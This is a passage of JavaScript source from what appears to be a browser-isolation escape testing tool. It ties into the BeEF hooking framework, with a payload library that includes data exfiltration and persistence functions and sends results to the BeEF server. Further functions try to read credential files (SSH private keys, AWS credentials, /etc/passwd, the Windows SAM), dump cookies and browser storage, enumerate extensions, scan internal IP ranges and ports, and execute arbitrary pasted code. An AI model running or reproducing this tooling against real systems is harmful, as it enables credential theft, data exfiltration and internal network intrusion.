    console.log('BeEF Isolation Escape Test Results:', results);
    
    // Send results via BeEF
    if (typeof beef !== 'undefined' && beef.net) {
        beef.net.send('/escape-tests', JSON.stringify(results));
    }
    
    return results;
}

// Execute payload functions
console.log('BeEF Payload Library Loaded');
console.log('Available functions:');
console.log('- beefBrowserFingerprint()');
console.log('- beefNetworkDiscovery()'); 
console.log('- beefEstablishPersistence()');
console.log('- beefDataExfiltration()');
console.log('- beefIsolationEscapeTests()');
            `;
            
            document.getElementById('custom-js').value = payloads;
            log('beef', '✅ BeEF payload library loaded into custom JS area', 'success');
            log('beef', 'Execute the payload functions from the custom JS section', 'info');
        }
        
        function openBeEFPanel() {
            const panelUrl = document.getElementById('beef-panel-url').value.trim();
            
            if (!panelUrl) {
                log('beef', 'Please enter BeEF panel URL first', 'error');
                return;
            }
            
            try {
                window.open(panelUrl, '_blank', 'width=1200,height=800,scrollbars=yes,resizable=yes');
                log('beef', `🎛️ BeEF control panel opened: ${panelUrl}`, 'success');
            } catch (error) {
                log('beef', `Failed to open BeEF panel: ${error.message}`, 'error');
            }
        }
        
        function unhookBeEF() {
            if (!beefHooked) {
                log('beef', 'Browser is not currently hooked to BeEF', 'info');
                return;
            }
            
            try {
                // Remove BeEF script
                const beefScript = document.getElementById('beef-hook-script');
                if (beefScript) {
                    beefScript.remove();
                }
                
                // Clear BeEF global object if possible
                if (typeof beef !== 'undefined') {
                    delete window.beef;
                }
                
                beefHooked = false;
                beefHookUrl = '';
                
                log('beef', '🔓 Browser unhooked from BeEF', 'warning');
                updateStats();
                
            } catch (error) {
                log('beef', `Error unhooking from BeEF: ${error.message}`, 'error');
            }
        }

        // Browser Abuse Functions
        async function testExtensionAccess() {
            log('browser', '🔍 Starting browser extension enumeration...', 'critical');
            escapeAttempts++;
            browserTestCount++;
            
            const output = document.getElementById('browser-output');
            
            // Clear previous results for clean screenshots
            const existingExtensionSection = output.querySelector('.screenshot-section');
            if (existingExtensionSection) {
                existingExtensionSection.remove();
            }
            
            displayHighlightBox('browser', 'Extension Enumeration Results', 'Scanning for accessible browser extensions...');
            
            // Test common extension protocols and IDs
            const commonExtensions = [
                { name: 'AdBlock', id: 'gighmmpiobklfepjocnamgkkbiglidom', protocol: 'chrome-extension' },
                { name: 'uBlock Origin', id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', protocol: 'chrome-extension' },
                { name: 'LastPass', id: 'hdokiejnpimakedhajhdlcegeplioahd', protocol: 'chrome-extension' },
                { name: 'Metamask', id: 'nkbihfbeogaeaoehlefnkodbefgpgknn', protocol: 'chrome-extension' },
                { name: 'Honey', id: 'bmnlcjabgnpnenekpadlanbbkooimhnj', protocol: 'chrome-extension' },
                { name: 'Grammarly', id: 'kbfnbcaeplbcioakkpcpgfkobkghlhen', protocol: 'chrome-extension' },
                { name: 'ColorZilla', id: 'bhlhnicpbhignkljdhlakddgfx91mmgq', protocol: 'chrome-extension' },
                { name: 'React DevTools', id: 'fmkadmapgofadopljbjfkapdkoienihi', protocol: 'chrome-extension' }
            ];
            
            const foundExtensions = [];
            
            for (const ext of commonExtensions) {
                try {
                    const manifestUrl = `${ext.protocol}://${ext.id}/manifest.json`;
                    const response = await fetch(manifestUrl, {
                        method: 'GET',
                        mode: 'cors'
                    });
                    
                    if (response.ok) {
                        const manifest = await response.text();
                        const manifestObj = JSON.parse(manifest);
                        
                        foundExtensions.push({
                            name: ext.name,
                            id: ext.id,
                            protocol: ext.protocol,
                            version: manifestObj.version || 'Unknown',
                            permissions: manifestObj.permissions || [],
                            manifest: manifestObj
                        });
                        
                        // Create extension card
                        const extensionHtml = `
                            <div class="extension-card">
                                <h4>🚨 FOUND: ${ext.name}</h4>
                                <div class="json-viewer">${formatJSON(manifestObj)}</div>
                            </div>
                        `;
                        output.innerHTML += extensionHtml;
                        
                        log('browser', `🚨 Extension accessible: ${ext.name} (${ext.id})`, 'critical');
                        successfulAttacks++;
                    }
                } catch (error) {
                    log('browser', `Extension not accessible: ${ext.name}`, 'info');
                }
            }
            
            // Test extension API access
            const apiTests = [];
            
            try {
                if (typeof chrome !== 'undefined') {
                    apiTests.push({ api: 'chrome', available: true, details: 'Chrome object detected' });
                    
                    if (chrome.runtime) {
                        apiTests.push({ api: 'chrome.runtime', available: true, details: `ID: ${chrome.runtime.id || 'Unknown'}` });
                        successfulAttacks++;
                    }
                    
                    if (chrome.tabs) {
                        apiTests.push({ api: 'chrome.tabs', available: true, details: 'Tabs API accessible' });
                        successfulAttacks++;
                    }
                    
                    if (chrome.storage) {
                        apiTests.push({ api: 'chrome.storage', available: true, details: 'Storage API accessible' });
                        successfulAttacks++;
                    }
                    
                    if (chrome.webRequest) {
                        apiTests.push({ api: 'chrome.webRequest', available: true, details: 'WebRequest API accessible' });
                        successfulAttacks++;
                    }
                } else {
                    apiTests.push({ api: 'chrome', available: false, details: 'Chrome object not available' });
                }
            } catch (error) {
                apiTests.push({ api: 'chrome', available: false, details: `Error: ${error.message}` });
            }
            
            // Display API test results in a table
            if (apiTests.length > 0) {
                displayDataTable('browser', 'Extension API Access Test Results', apiTests, ['api', 'available', 'details']);
            }
            
            // Display summary
            displayDataCard('browser', `Extension Scan Summary (${foundExtensions.length} found)`, {
                totalScanned: commonExtensions.length,
                foundExtensions: foundExtensions.length,
                accessibleAPIs: apiTests.filter(t => t.available).length,
                criticalFindings: foundExtensions.map(e => `${e.name} (${e.version})`)
            }, 'key-value');
            
            updateStats();
            log('browser', `Extension enumeration completed. Found ${foundExtensions.length} accessible extensions`, 'success');
        }

        async function testConfigModification() {
            log('browser', '⚙️ Testing browser configuration modification...', 'critical');
            escapeAttempts++;
            browserTestCount++;
            
            // Test localStorage/sessionStorage access
            try {
                localStorage.setItem('escape_test', 'success');
                const testValue = localStorage.getItem('escape_test');
                if (testValue === 'success') {
                    log('browser', '🚨 localStorage write/read successful!', 'critical');
                    successfulAttacks++;
                }
                localStorage.removeItem('escape_test');
            } catch (error) {
                log('browser', 'localStorage access blocked', 'warning');
            }
            
            // Test cookie access
            try {
                document.cookie = 'escape_test=success; path=/';
                if (document.cookie.includes('escape_test=success')) {
                    log('browser', '🚨 Cookie write access successful!', 'critical');
                    successfulAttacks++;
                }
            } catch (error) {
                log('browser', 'Cookie access blocked', 'warning');
            }
            
            // Test history manipulation
            try {
                history.pushState({test: 'escape'}, 'Test', '/escape-test');
                log('browser', '🚨 History manipulation successful!', 'critical');
                successfulAttacks++;
                history.back();
            } catch (error) {
                log('browser', 'History manipulation blocked', 'warning');
            }
            
            updateStats();
            log('browser', 'Configuration modification tests completed', 'success');
        }

        async function testLocalFileAccess() {
            log('browser', '📁 Testing local file access...', 'warning');
            escapeAttempts++;
            browserTestCount++;
            
            const output = document.getElementById('browser-output');
            
            displayHighlightBox('browser', 'Local File System Access Test', 'Attempting to access local files and directories...');
            
            const fileAccessResults = [];
            
            const localFilePaths = [
                { path: 'file:///etc/passwd', description: 'Linux Password File', os: 'Linux' },
                { path: 'file:///etc/hosts', description: 'Linux Hosts File', os: 'Linux' },
                { path: 'file:///Windows/System32/drivers/etc/hosts', description: 'Windows Hosts File', os: 'Windows' },
                { path: 'file:///Windows/win.ini', description: 'Windows Configuration', os: 'Windows' },
                { path: 'file:///Users/', description: 'macOS Users Directory', os: 'macOS' },
                { path: 'file:///home/', description: 'Linux Home Directory', os: 'Linux' },
                { path: 'file:///.aws/credentials', description: 'AWS Credentials', os: 'Any' },
                { path: 'file:///.ssh/id_rsa', description: 'SSH Private Key', os: 'Unix-like' },
                { path: 'file:///.ssh/known_hosts', description: 'SSH Known Hosts', os: 'Unix-like' },
                { path: 'file:///C:/Windows/System32/config/SAM', description: 'Windows SAM Database', os: 'Windows' }
            ];
            
            for (const fileTest of localFilePaths) {
                try {
                    const startTime = Date.now();
                    const response = await fetch(fileTest.path, {
                        signal: AbortSignal.timeout(2000)
                    });
                    
                    const responseTime = Date.now() - startTime;
                    
                    if (response.ok) {
                        const content = await response.text();
                        const result = {
                            path: fileTest.path,
                            description: fileTest.description,
                            os: fileTest.os,
                            accessible: true,
                            size: content.length,
                            responseTime: responseTime,
                            contentPreview: content.substring(0, 200),
                            contentType: response.headers.get('content-type') || 'unknown'
                        };
                        
                        fileAccessResults.push(result);
                        
                        // Create detailed file access card
                        const fileCardHtml = `
                            <div class="data-card" style="border: 2px solid #ff0000; background: #2a0000;">
                                <h3>🚨 CRITICAL: File Access Successful - ${fileTest.description}</h3>
                                <div class="json-viewer">
                                    <span class="json-key">Path:</span> <span class="json-string">${fileTest.path}</span><br>
                                    <span class="json-key">OS:</span> <span class="json-string">${fileTest.os}</span><br>
                                    <span class="json-key">Size:</span> <span class="json-number">${content.length}</span> bytes<br>
                                    <span class="json-key">Response Time:</span> <span class="json-number">${responseTime}</span>ms<br>
                                    <span class="json-key">Content Type:</span> <span class="json-string">${result.contentType}</span><br><br>
                                    <span class="json-key">Content Preview:</span><br>
                                    <div style="background: #000; padding: 10px; margin: 5px 0; border-radius: 3px; font-size: 10px; color: #00ff00;">
${content.substring(0, 500)}${content.length > 500 ? '...\n\n[TRUNCATED - Full content available]' : ''}
                                    </div>
                                </div>
                            </div>
                        `;
                        
                        output.innerHTML += fileCardHtml;
                        
                        log('browser', `🚨 CRITICAL: File access successful - ${fileTest.path}`, 'critical');
                        log('browser', `  Size: ${content.length} bytes, Content: ${content.substring(0, 100)}...`, 'info');
                        successfulAttacks++;
                    } else {
                        fileAccessResults.push({
                            path: fileTest.path,
                            description: fileTest.description,
                            os: fileTest.os,
                            accessible: false,
                            status: response.status,
                            responseTime: responseTime
                        });
                    }
                } catch (error) {
                    fileAccessResults.push({
                        path: fileTest.path,
                        description: fileTest.description,
                        os: fileTest.os,
                        accessible: false,
                        error: error.message
                    });
                }
            }
            
            // Test file input capabilities
            try {
                const fileInputTests = [];
                
                // Test regular file input
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInputTests.push({
                    type: 'Regular File Input',
                    available: fileInput.type === 'file',
                    multiple: fileInput.hasAttribute('multiple')
                });
                
                // Test directory access
                const dirInput = document.createElement('input');
                dirInput.type = 'file';
                dirInput.webkitdirectory = true;
                fileInputTests.push({
                    type: 'Directory Access',
                    available: dirInput.webkitdirectory === true,
                    security_impact: 'Full directory traversal possible'
                });
                
                // Test multiple file selection
                const multiInput = document.createElement('input');
                multiInput.type = 'file';
                multiInput.multiple = true;
                fileInputTests.push({
                    type: 'Multiple File Selection',
                    available: multiInput.multiple === true,
                    security_impact: 'Bulk file access possible'
                });
                
                if (fileInputTests.some(test => test.available)) {
                    displayDataCard('browser', '🚨 File Input Capabilities', fileInputTests, 'json');
                    log('browser', '🚨 File input elements available - potential for file system access!', 'critical');
                    successfulAttacks++;
                }
                
            } catch (error) {
                log('browser', `File input test failed: ${error.message}`, 'error');
            }
            
            // Display comprehensive file access summary
            const accessibleFiles = fileAccessResults.filter(f => f.accessible);
            const fileSummary = {
                totalFilesAttempted: fileAccessResults.length,
                accessibleFiles: accessibleFiles.length,
                operatingSystems: [...new Set(accessibleFiles.map(f => f.os))],
                criticalFiles: accessibleFiles.filter(f => 
                    f.path.includes('passwd') || 
                    f.path.includes('SAM') || 
                    f.path.includes('id_rsa') || 
                    f.path.includes('credentials')
                ).length,
                totalDataSize: accessibleFiles.reduce((sum, f) => sum + (f.size || 0), 0),
                securityImplications: accessibleFiles.length > 0 ? [
                    'Local file system accessible from browser',
                    'Sensitive system files may be readable',
                    'Potential for credential harvesting',
                    'File system enumeration possible'
                ] : ['Local file access properly restricted']
            };
            
            if (accessibleFiles.length > 0) {
                displayDataTable('browser', '🚨 File Access Results', 
                    accessibleFiles.map(f => ({
                        'File Path': f.path,
                        'Description': f.description,
                        'OS': f.os,
                        'Size (bytes)': f.size || 'N/A',
                        'Response Time': f.responseTime ? `${f.responseTime}ms` : 'N/A',
                        'Content Type': f.contentType || 'N/A'
                    })), 
                    ['File Path', 'Description', 'OS', 'Size (bytes)', 'Response Time', 'Content Type']
                );
            }
            
            displayDataCard('browser', '📊 File Access Assessment Summary', fileSummary, 'key-value');
            
            updateStats();
            log('browser', `File access tests completed. ${accessibleFiles.length}/${fileAccessResults.length} files accessible`, 'success');
        }

        async function testLocalStorage() {
            log('browser', '💾 Testing local storage abuse...', 'warning');
            escapeAttempts++;
            browserTestCount++;
            
            const output = document.getElementById('browser-output');
            
            // Clear previous storage results
            const existingStorageSection = output.querySelectorAll('.screenshot-section');
            existingStorageSection.forEach(section => {
                if (section.textContent.includes('Storage')) {
                    section.remove();
                }
            });
            
            displayHighlightBox('browser', 'Local Storage Analysis', 'Analyzing all available storage mechanisms...');
            
            const storageResults = {};
            
            // Test localStorage
            try {
                if (typeof localStorage !== 'undefined') {
                    const localStorageData = {};
                    const localStorageInfo = {
                        available: true,
                        keysCount: localStorage.length,
                        totalSize: 0
                    };
                    
                    // Read all localStorage data
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        localStorageData[key] = value;
                        localStorageInfo.totalSize += (key.length + value.length);
                    }
                    
                    // Test write capability
                    try {
                        const testKey = 'escape_test_' + Date.now();
                        const testData = {
                            timestamp: Date.now(),
                            browser: navigator.userAgent,
                            origin: window.location.origin,
                            testData: 'Browser isolation escape test data'
                        };
                        
                        localStorage.setItem(testKey, JSON.stringify(testData));
                        const retrieved = localStorage.getItem(testKey);
                        
                        if (retrieved) {
                            localStorageInfo.writeAccess = true;
                            localStorageData[testKey] = JSON.parse(retrieved);
                            log('browser', '🚨 localStorage write access confirmed!', 'critical');
                            successfulAttacks++;
                        }
                        
                        localStorage.removeItem(testKey);
                    } catch (writeError) {
                        localStorageInfo.writeAccess = false;
                        localStorageInfo.writeError = writeError.message;
                    }
                    
                    storageResults.localStorage = {
                        info: localStorageInfo,
                        data: localStorageData
                    };
                    
                    // Display localStorage contents in a detailed view
                    if (Object.keys(localStorageData).length > 0) {
                        displayDataCard('browser', `🚨 localStorage Contents (${localStorageInfo.keysCount} items, ${localStorageInfo.totalSize} chars)`, localStorageData, 'key-value');
                        log('browser', `🚨 localStorage contains ${localStorageInfo.keysCount} items with sensitive data!`, 'critical');
                        successfulAttacks++;
                    } else {
                        displayDataCard('browser', 'localStorage Status', localStorageInfo, 'key-value');
                    }
                }
            } catch (error) {
                storageResults.localStorage = { available: false, error: error.message };
                log('browser', `localStorage access denied: ${error.message}`, 'warning');
            }
            
            // Test sessionStorage
            try {
                if (typeof sessionStorage !== 'undefined') {
                    const sessionStorageData = {};
                    const sessionStorageInfo = {
                        available: true,
                        keysCount: sessionStorage.length,
                        totalSize: 0
                    };
                    
                    // Read all sessionStorage data
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        sessionStorageData[key] = value;
                        sessionStorageInfo.totalSize += (key.length + value.length);
                    }
                    
                    // Test write capability
                    try {
                        const testKey = 'session_escape_test_' + Date.now();
                        const testData = {
                            sessionStart: Date.now(),
                            capabilities: {
                                webrtc: typeof RTCPeerConnection !== 'undefined',
                                websockets: typeof WebSocket !== 'undefined',
                                geolocation: 'geolocation' in navigator
                            }
                        };
                        
                        sessionStorage.setItem(testKey, JSON.stringify(testData));
                        sessionStorageInfo.writeAccess = sessionStorage.getItem(testKey) !== null;
                        
                        if (sessionStorageInfo.writeAccess) {
                            sessionStorageData[testKey] = testData;
                            log('browser', '🚨 sessionStorage write access confirmed!', 'critical');
                            successfulAttacks++;
                        }
                    } catch (writeError) {
                        sessionStorageInfo.writeAccess = false;
                        sessionStorageInfo.writeError = writeError.message;
                    }
                    
                    storageResults.sessionStorage = {
                        info: sessionStorageInfo,
                        data: sessionStorageData
                    };
                    
                    // Display sessionStorage contents
                    if (Object.keys(sessionStorageData).length > 0) {
                        displayDataCard('browser', `🚨 sessionStorage Contents (${sessionStorageInfo.keysCount} items)`, sessionStorageData, 'key-value');
                        log('browser', `🚨 sessionStorage contains ${sessionStorageInfo.keysCount} items!`, 'critical');
                        successfulAttacks++;
                    } else {
                        displayDataCard('browser', 'sessionStorage Status', sessionStorageInfo, 'key-value');
                    }
                }
            } catch (error) {
                storageResults.sessionStorage = { available: false, error: error.message };
                log('browser', `sessionStorage access denied: ${error.message}`, 'warning');
            }
            
            // Test IndexedDB
            try {
                const indexedDBTest = await new Promise((resolve, reject) => {
                    const request = indexedDB.open('EscapeTestDB', 1);
                    const timeout = setTimeout(() => reject(new Error('timeout')), 3000);
                    
                    request.onsuccess = function(event) {
                        clearTimeout(timeout);
                        const db = event.target.result;
                        
                        // Try to get database info
                        const dbInfo = {
                            name: db.name,
                            version: db.version,
                            objectStoreNames: Array.from(db.objectStoreNames)
                        };
                        
                        db.close();
                        resolve({
                            available: true,
                            info: dbInfo,
                            writeAccess: true
                        });
                    };
                    
                    request.onerror = function(event) {
                        clearTimeout(timeout);
                        reject(new Error(event.target.error));
                    };
                    
                    request.onupgradeneeded = function(event) {
                        const db = event.target.result;
                        const objectStore = db.createObjectStore('testStore', { keyPath: 'id' });
                        objectStore.add({ id: 1, data: 'escape_test_data', timestamp: Date.now() });
                    };
                });
                
                storageResults.indexedDB = indexedDBTest;
                displayDataCard('browser', '🚨 IndexedDB Access Successful', indexedDBTest, 'key-value');
                log('browser', '🚨 IndexedDB access and write successful!', 'critical');
                successfulAttacks++;
                
            } catch (error) {
                storageResults.indexedDB = { available: false, error: error.message };
                log('browser', `IndexedDB access failed: ${error.message}`, 'warning');
            }
            
            // Test Cookies
            try {
                const cookieInfo = {
                    available: navigator.cookieEnabled,
                    currentCookies: document.cookie,
                    cookieCount: document.cookie ? document.cookie.split(';').length : 0
                };
                
                // Test cookie write
                const testCookieName = 'escape_test_cookie';
                const testCookieValue = btoa(JSON.stringify({
                    timestamp: Date.now(),
                    test: 'browser_isolation_escape',
                    userAgent: navigator.userAgent
                }));
                
                document.cookie = `${testCookieName}=${testCookieValue}; path=/; max-age=3600`;
                
                if (document.cookie.includes(testCookieName)) {
                    cookieInfo.writeAccess = true;
                    cookieInfo.testCookieValue = testCookieValue;
                    log('browser', '🚨 Cookie write access confirmed!', 'critical');
                    successfulAttacks++;
                } else {
                    cookieInfo.writeAccess = false;
                }
                
                storageResults.cookies = cookieInfo;
                
                if (cookieInfo.currentCookies) {
                    displayDataCard('browser', '🚨 Cookie Analysis', {
                        cookiesEnabled: cookieInfo.available,
                        totalCookies: cookieInfo.cookieCount,
                        cookieData: cookieInfo.currentCookies,
                        writeAccess: cookieInfo.writeAccess
                    }, 'key-value');
                    log('browser', `🚨 Found ${cookieInfo.cookieCount} cookies with data!`, 'critical');
                }
                
            } catch (error) {
                storageResults.cookies = { available: false, error: error.message };
                log('browser', `Cookie access failed: ${error.message}`, 'warning');
            }
            
            // Display comprehensive storage summary
            const storageSummary = {
                totalStorageTypes: Object.keys(storageResults).length,
                accessibleStorage: Object.values(storageResults).filter(s => s.available !== false).length,
                writeCapabilities: Object.values(storageResults).filter(s => s.writeAccess === true).length,
                dataFound: Object.values(storageResults).some(s => s.data && Object.keys(s.data).length > 0),
                securityImplications: []
            };
            
            if (storageSummary.writeCapabilities > 0) {
                storageSummary.securityImplications.push('Persistence possible via storage mechanisms');
            }
            if (storageSummary.dataFound) {
                storageSummary.securityImplications.push('Sensitive data accessible in storage');
            }
            if (storageResults.localStorage?.available) {
                storageSummary.securityImplications.push('Cross-session data persistence available');
            }
            
            displayDataCard('browser', '📊 Storage Security Assessment Summary', storageSummary, 'key-value');
            
            updateStats();
            log('browser', `Storage analysis completed. ${storageSummary.accessibleStorage}/${storageSummary.totalStorageTypes} storage types accessible`, 'success');
        }

        function executeCustomJS() {
            log('javascript', '⚡ Executing custom JavaScript...', 'critical');
            escapeAttempts++;
            
            const customCode = document.getElementById('custom-js').value;
            if (!customCode.trim()) {
                log('javascript', 'No custom JavaScript provided', 'warning');
                return;
            }
            
            try {
                // Create a new function to isolate execution
                const executeCode = new Function('log', 'successfulAttacks', 'updateStats', customCode);
                executeCode(
                    (msg, type) => log('javascript', msg, type),
                    successfulAttacks,
                    updateStats
                );
                
                log('javascript', '✅ Custom JavaScript executed successfully', 'success');
                successfulAttacks++;
                
            } catch (error) {
                log('javascript', `❌ Execution failed: ${error.message}`, 'error');
                log('javascript', `Stack trace: ${error.stack}`, 'info');
            }
            
            updateStats();
        }

        function loadJSPayloads() {
            const payloads = `// Browser Information Gathering
console.log('User Agent:', navigator.userAgent);
console.log('Platform:', navigator.platform);
console.log('Languages:', navigator.languages);
console.log('Cookies Enabled:', navigator.cookieEnabled);
console.log('Online Status:', navigator.onLine);

// Extension Detection
try {
    console.log('Chrome:', typeof chrome);
    console.log('Safari:', typeof safari);
    console.log('Firefox:', typeof InstallTrigger);
    if (typeof chrome !== 'undefined' && chrome.runtime) {
        console.log('Chrome Extension Context:', chrome.runtime.id);
    }
} catch(e) { console.log('Browser detection error:', e.message); }

// Local Storage Testing
try {
    localStorage.setItem('test_key', 'test_value');
    console.log('localStorage write test:', localStorage.getItem('test_key'));
    localStorage.removeItem('test_key');
} catch(e) { console.log('localStorage error:', e.message); }

// Configuration Access
try {
    console.log('Document domain:', document.domain);
    console.log('Window location:', window.location.href);
    console.log('Referrer:', document.referrer);
} catch(e) { console.log('Config access error:', e.message); }

// File System API Detection
try {
    if ('showOpenFilePicker' in window) {
        console.log('File System Access API available');
    }
} catch(e) { console.log('File API error:', e.message); }

// Internal Network Discovery
const testIPs = ['192.168.1.1', '10.0.0.1', '172.16.0.1'];
testIPs.forEach(ip => {
    fetch('http://' + ip, {mode: 'no-cors', signal: AbortSignal.timeout(1000)})
        .then(() => console.log('Network accessible:', ip))
        .catch(() => {}); // Silent fail for inaccessible IPs
});`;

            document.getElementById('custom-js').value = payloads;
            log('javascript', 'Core payload library loaded', 'success');
        }

        // Network Enumeration Functions
        async function enumerateLocalHosts() {
            log('network', '🕸️ Starting local host enumeration...', 'critical');
            escapeAttempts++;
            
            const output = document.getElementById('network-output');
            
            // Clear previous results
            const existingNetworkSection = output.querySelectorAll('.screenshot-section');
            existingNetworkSection.forEach(section => {
                if (section.textContent.includes('Network') || section.textContent.includes('Host')) {
                    section.remove();
                }
            });
            
            displayHighlightBox('network', 'Internal Network Discovery', 'Scanning internal network ranges for accessible hosts...');
            
            const localRanges = [
                { name: 'Private Class C (192.168.1.x)', range: '192.168.1.', start: 1, end: 20 },
                { name: 'Private Class C Alt (192.168.0.x)', range: '192.168.0.', start: 1, end: 20 },
                { name: 'Private Class A (10.0.0.x)', range: '10.0.0.', start: 1, end: 20 },
                { name: 'Private Class B (172.16.0.x)', range: '172.16.0.', start: 1, end: 20 },
                { name: 'Localhost Range', range: '127.0.0.', start: 1, end: 5 }
            ];
            
            const discoveredHosts = [];
            const testResults = [];
            
            for (const range of localRanges) {
                log('network', `Scanning ${range.name}...`, 'info');
                
                for (let i = range.start; i <= range.end; i++) {
                    const ip = range.range + i;
                    const hostResult = {
                        ip: ip,
                        range: range.name,
                        status: 'timeout',
                        responseTime: null,
                        protocol: null,
                        ports: []
                    };
                    
                    // Test common ports
                    const commonPorts = [80, 443, 8080, 8443, 22, 21, 25, 53, 3389, 5900];
                    
                    for (const port of commonPorts.slice(0, 4)) { // Test first 4 ports to avoid too many requests
                        try {
                            const startTime = Date.now();
                            const response = await fetch(`http://${ip}:${port}`, {
                                method: 'HEAD',
                                mode: 'no-cors',
                                signal: AbortSignal.timeout(1000)
                            });
                            
                            const responseTime = Date.now() - startTime;
                            hostResult.status = 'accessible';
                            hostResult.responseTime = responseTime;
                            hostResult.protocol = 'HTTP';
                            hostResult.ports.push({ port: port, protocol: 'HTTP', accessible: true, responseTime: responseTime });
                            
                            log('network', `✅ Host discovered: ${ip}:${port} (${responseTime}ms)`, 'success');
                            
                            if (!discoveredHosts.find(h => h.ip === ip)) {
                                discoveredHosts.push(hostResult);
                                
                                // Add to targets if not already present
                                if (!targets.find(t => t.host === ip)) {
                                    targets.push({
                                        host: ip,
                                        port: port.toString(),
                                        service: 'discovered',
                                        status: 'accessible'
                                    });
                                }
                            }
                            
                            break; // Found accessible port, move to next IP
                            
                        } catch (error) {
                            // Try HTTPS
                            try {
                                const startTime = Date.now();
                                const response = await fetch(`https://${ip}:${port}`, {
                                    method: 'HEAD',
                                    mode: 'no-cors',
                                    signal: AbortSignal.timeout(1000)
                                });
                                
                                const responseTime = Date.now() - startTime;
                                hostResult.status = 'accessible';
                                hostResult.responseTime = responseTime;
                                hostResult.protocol = 'HTTPS';
                                hostResult.ports.push({ port: port, protocol: 'HTTPS', accessible: true, responseTime: responseTime });
                                
                                log('network', `✅ Host discovered: ${ip}:${port} via HTTPS (${responseTime}ms)`, 'success');
                                
                                if (!discoveredHosts.find(h => h.ip === ip)) {
                                    discoveredHosts.push(hostResult);
                                    
                                    if (!targets.find(t => t.host === ip)) {
                                        targets.push({
                                            host: ip,
                                            port: port.toString(),
                                            service: 'discovered',
                                            status: 'accessible'
                                        });
                                    }
                                }
                                
                                break;
                                
                            } catch (httpsError) {
                                hostResult.ports.push({ port: port, protocol: 'HTTP/HTTPS', accessible: false, error: error.message });
                            }
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, 50)); // Rate limiting
                    }
                    
                    testResults.push(hostResult);
                }
            }
            
            // Display discovered hosts in a detailed table
            if (discoveredHosts.length > 0) {
                const hostTableData = discoveredHosts.map(host => ({
                    'IP Address': host.ip,
                    'Status': host.status,
                    'Protocol': host.protocol,
                    'Response Time': host.responseTime ? `${host.responseTime}ms` : 'N/A',
                    'Open Ports': host.ports.filter(p => p.accessible).map(p => `${p.port}/${p.protocol}`).join(', '),
                    'Network Range': host.range
                }));
                
                displayDataTable('network', `🚨 Discovered Internal Hosts (${discoveredHosts.length} found)`, hostTableData, 
                    ['IP Address', 'Status', 'Protocol', 'Response Time', 'Open Ports', 'Network Range']);
                
                // Display individual host cards for detailed view
                discoveredHosts.forEach(host => {
                    const hostHtml = `
                        <div class="network-host">
                            <div class="host-info">
                                <strong>🎯 ${host.ip}</strong> - ${host.protocol} (${host.responseTime}ms)
                                <br><small>Ports: ${host.ports.filter(p => p.accessible).map(p => p.port).join(', ')}</small>
                            </div>
                            <div class="host-status accessible">ACCESSIBLE</div>
                        </div>
                    `;
                    output.innerHTML += hostHtml;
                });
                
                successfulAttacks++;
            }
            
            // Display comprehensive scan summary
            const scanSummary = {
                totalIPsScanned: testResults.length,
                accessibleHosts: discoveredHosts.length,
                networksWithHosts: [...new Set(discoveredHosts.map(h => h.range))].length,
                commonPorts: [...new Set(discoveredHosts.flatMap(h => h.ports.filter(p => p.accessible).map(p => p.port)))],
                securityImplications: [
                    discoveredHosts.length > 0 ? 'Internal network accessible from browser' : 'No internal hosts discovered',
                    `${discoveredHosts.length} potential pivot points identified`,
                    discoveredHosts.some(h => h.ports.some(p => p.port === 22)) ? 'SSH services detected' : 'No SSH services found',
                    discoveredHosts.some(h => h.ports.some(p => p.port === 3389)) ? 'RDP services detected' : 'No RDP services found'
                ]
            };
            
            displayDataCard('network', '📊 Network Discovery Summary', scanSummary, 'key-value');
            
            if (discoveredHosts.length > 0) {
                updateTargetList();
            }
            
            updateStats();
            log('network', `Host enumeration completed. Found ${discoveredHosts.length} responsive hosts out of ${testResults.length} scanned`, 'success');
        }

        async function testInternalAssets() {
            log('network', '🎯 Testing access to internal assets...', 'critical');
            escapeAttempts++;
            
            let accessibleCount = 0;
            const totalTargets = targets.length;
            
            for (let i = 0; i < targets.length; i++) {
                const target = targets[i];
                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
                
                try {
                    const protocols = ['http', 'https'];
                    
                    for (const protocol of protocols) {
                        try {
                            const startTime = Date.now();
                            const response = await fetch(`${protocol}://${fullTarget}`, {
                                method: 'HEAD',
                                mode: 'no-cors',
                                signal: AbortSignal.timeout(3000)
                            });
                            
                            const responseTime = Date.now() - startTime;
                            target.status = 'accessible';
                            log('network', `✅ ${fullTarget} accessible via ${protocol.toUpperCase()} (${responseTime}ms)`, 'success');
                            accessibleCount++;
                            break; // Success with one protocol is enough
                            
                        } catch (protocolError) {
                            // Try next protocol
                        }
                    }
                    
                    if (target.status === 'unknown') {
                        target.status = 'blocked';
                    }
                    
                } catch (error) {
                    target.status = 'error';
                    log('network', `❌ ${fullTarget} - Error: ${error.message}`, 'error');
                }
                
                updateProgress(i + 1, totalTargets);
                await new Promise(resolve => setTimeout(resolve, 100)); // Rate limiting
            }
            
            if (accessibleCount > 0) {
                successfulAttacks++;
            }
            
            updateTargetList();
            updateStats();
            log('network', `Internal asset testing completed. ${accessibleCount}/${totalTargets} targets accessible`, 'success');
        }

        async function portScanTargets() {
            log('network', '🔍 Performing port scanning on targets...', 'warning');
            escapeAttempts++;
            
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9000];
            
            for (const target of targets.slice(0, 10)) { // Limit to first 10 targets
                if (target.status === 'blocked') continue;
                
                log('network', `Scanning ports for ${target.host}...`, 'info');
                let openPorts = [];
                
                for (const port of commonPorts) {
                    try {
                        const response = await fetch(`http://${target.host}:${port}`, {
                            method: 'HEAD',
                            mode: 'no-cors',
                            signal: AbortSignal.timeout(1000)
                        });
                        
                        openPorts.push(port);
                        log('network', `  Port ${port} open on ${target.host}`, 'success');
                        
                    } catch (error) {
                        // Port closed or filtered
                    }
                }
                
                if (openPorts.length > 0) {
                    log('network', `${target.host} has ${openPorts.length} open ports: ${openPorts.join(', ')}`, 'success');
                    successfulAttacks++;
                } else {
                    log('network', `No open ports found on ${target.host}`, 'info');
                }
                
                await new Promise(resolve => setTimeout(resolve, 200));
            }
            
            updateStats();
